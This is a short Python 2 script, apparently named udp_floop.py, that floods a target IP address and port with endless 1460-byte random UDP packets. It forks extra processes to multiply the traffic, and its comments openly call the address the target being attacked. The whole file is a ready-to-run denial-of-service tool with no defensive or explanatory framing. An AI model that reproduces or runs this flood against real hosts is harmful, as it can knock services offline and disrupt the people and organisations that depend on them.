import socket #Imports needed libraries
import random
import os
import sys

if len(sys.argv) != 3:
	print "Usage: python udp_floop.py <IP> <PORT>"
	sys.exit(1)

def attack(ip, port):
	sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a  IP UDP socket
	bytes=random._urandom(1460) #Creates packet

	while 1: #Infinitely loops sending packets to the port until the program is exited.
		sock.sendto(bytes,(ip,port))



def child(ip, port):
	attack(ip, port)

def parent():

	counter = 0
#	ip=raw_input('Target IP: ') #The IP we are attacking
#	port=raw_input('Port: ') #The IP we are attacking
	while counter < 3:
		pid = os.fork()
		if(pid == 0):
			child(sys.argv[1], int(sys.argv[2]))
		else:
			attack(sys.argv[1], int(sys.argv[2]))
		counter = counter + 1

parent()
